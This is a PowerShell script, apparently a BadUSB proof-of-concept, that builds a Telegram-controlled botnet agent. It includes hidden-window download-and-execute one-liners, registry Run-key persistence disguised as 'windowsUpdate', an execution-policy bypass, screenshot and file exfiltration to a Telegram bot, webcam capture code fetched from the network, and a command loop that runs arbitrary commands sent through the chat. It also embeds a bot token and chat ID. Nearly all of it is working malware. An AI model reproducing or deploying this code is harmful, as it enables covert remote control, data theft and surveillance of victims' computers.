<#
BADUSB COMMANDS:
    # Execute 
    powershell.exe -windowstyle hidden -file this_file.ps1

    #Execute script from github
    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))

REGEDIT:
	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
https://www.akadia.com/services/windows_registry.html 

BOT TELEGRAM:
    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
	#>


############
## CONFIG ##
############

$BotToken = "607938250:AAEbd_t6w86-hgFrqXJgxwdOT5-Rd7aFoY0"
$ChatID = '-258947251'
$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'


###############
## FUNCTIONS ##
###############

function backdoor {
        Write-Host "Downloading backdoor.."
        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1

        Write-Host "Adding backdoor to the reg.."
		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"

        # Check backdoor
        #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
        $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
		
        # Backdoor on startup programs
        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
        Invoke-Expression -Command:$command
}

function screenshot {
      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
        function screenshot([Drawing.Rectangle]$bounds, $path) {
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

           $bmp.Save($path)

           $graphics.Dispose()
           $bmp.Dispose()
        }
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        screenshot $bounds "C:\Users\afranco\Documents\screenshot.jpg"
}

function cleanAll {
    # Remove screenshots
    rm C:\Users\$env:USERPROFILE\Documents\screenshot.jpg
    # Remove cUrl
    rm C:\Users\$env:USERPROFILE\AppData\Local\Temp\1
    # Remove backdoor
    rm C:\Users\$env:USERPROFILE\Documents\windowsUpdate.ps1
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
}

function installCurl {
    $curl = $env:USERPROFILE + "\appdata\local\temp\1\curl.exe"
    if(![System.IO.File]::Exists($curl)){
        # file with path $path doesn't exist
        $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
        $curl_zip = $ruta + "\curl.zip"
        $curl = $ruta + "\" + "curl.exe"
        $curl_mod = $ruta + "\" + "curl_mod.exe"
        if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
        }
        return $curl
    }
    # else curl exist
    return $curl    
}

function sendPhoto {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\afranco\Documents\screenshot.jpg"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    
    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
}

function keylogger {

}

function ipPublic {
    #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
    $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
}

function download($FileToDownload) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
    $curl = installCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden

    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
}

function webcam {
    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1'))
    (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1','Get-WebCamp.ps1')
    #./Get-WebCamp.ps1 "Get-WebCamp"
    Import-Module Get-WebCamp.ps1
    Get-WebCamImage -CamIndex 0 -UseCam -interval 3
}

function mainBrowser {
    Write-Host "Checking main browser on the reg.."
    $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
    if ($mainBrowser -match 'chrome') {
        Write-Host "Chrome!"
        $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
        return $chrome
     }
    ElseIf ($mainBrowser -match 'Firefox') {
        Write-Host "Firefox!"
        $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
        return $firefox
     }
}

function hackTwitter {
    $mainBrowser = mainBrowser
    Start-Process $mainBrowser -ArgumentList "https://twitter.com/" -WindowStyle Hidden

    Start-Sleep -Seconds 2
    $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('cisco finesse') 

    Sleep -Seconds 1 $wshell.SendKeys{USER} 
    sleep -Seconds 7 $wshell.SendKeys("{TAB}") 
    Sleep -Seconds 1 $wshell.SendKeys('PASSWORD') 
    Sleep -Seconds 1 $wshell.SendKeys("{TAB}") 
    Sleep -Seconds 1 $wshell.SendKeys('~')
}


#####################
## BYPASS POLICIES ##
#####################

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted


##########################
## CONNECT WITH CHANNEL ##
##########################
$whoami = Invoke-Expression whoami
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
$ipV4 = $ipV4.IPAddressToString
$hostname = Invoke-Expression hostname
$pwd = pwd

$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
if($nopreview) { $preview_mode = "True" }
if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}

$payload = @{
    "chat_id" = $ChatID;
    "text" = $info;
    "parse_mode" = $markdown_mode;
    "disable_web_page_preview" = $preview_mode;
}
Invoke-WebRequest `
    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
    -Method Post `
    -ContentType "application/json;charset=utf-8" `
    -Body (ConvertTo-Json -Compress -InputObject $payload)


######################
## WAIT FOR COMMAND ##
######################

#Time to sleep for each loop before checking if a message with the magic word was received
$LoopSleep = 3
 
 
#Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
$BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
$LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
 
#Read the responses in a while cycle
$DoNotExit = 1
#$PreviousLoop_LastMessageTime is going to be updated at every cycle (if the last message date changes)
$PreviousLoop_LastMessageTime = $LastMessageTime_Origin
 
$SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
While ($DoNotExit)  {
  Sleep -Seconds $LoopSleep
  #Reset variables that might be dirty from the previous cycle
  $LastMessageText = ""
  $CommandToRun = ""
  $CommandToRun_Result = ""
  $CommandToRun_SimplifiedOutput = ""
  $Message = ""
  
  #Get the current Bot Updates and store them in an array format to make it easier
  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
  $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
  
  #Get just the last message:
  $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count-1]
  #Get the last message time
  $LastMessageTime = $LastMessage.message.date
  
  #If the $LastMessageTime is newer than $PreviousLoop_LastMessageTime, then the user has typed something!
  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
    #Looks like there's a new message!
    
	#Update $PreviousLoop_LastMessageTime with the time from the latest message
	$PreviousLoop_LastMessageTime = $LastMessageTime
	#Update the LastMessageTime
	$LastMessageTime = $LastMessage.Message.Date
	#Update the $LastMessageText
	$LastMessageText = $LastMessage.Message.Text
	
	Switch -Wildcard ($LastMessageText)  {
	  "/select $ipV4 *"  { #Important: run with a space
	    #The user wants to run a command
		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
		
		#Run the command
		Try {
		  Invoke-Expression $CommandToRun | Out-String | %  {
		    $CommandToRun_Result += "`n $($_)"
		  }
		}
		Catch  {
		  $CommandToRun_Result = $_.Exception.Message
		}
		
		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
        $pwd = pwd
        $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
	  }
	  "/stop $ipV4"  {
		#The user wants to stop the script
		write-host "The script will end in 5 seconds"
		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
		Sleep -seconds 5
		$DoNotExit = 0
	  }
      "/list"  {
        Invoke-WebRequest `
        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
        -Method Post `
        -ContentType "application/json;charset=utf-8" `
        -Body (ConvertTo-Json -Compress -InputObject $payload)
      }
      "/screenshot $ipV4"{
        screenshot
        sendPhoto
      }
      "/backdoor $ipV4"  {
        backdoor
      }
      "/meterpreter $ipV4"  {
         
      }
      "/cleanAll $ipV4" {
        cleanAll
      }
      "/ipPublic $ipV4" {
        ipPublic
      }
      "/download $ipV4 *"{
        $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
        download $FileToDownload
      }
      "/hackTwitter $ipV4"{
        hackTwitter
      }
	  default  {
	    #The message sent is unknown
		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
	  }
	}
	
  }
}

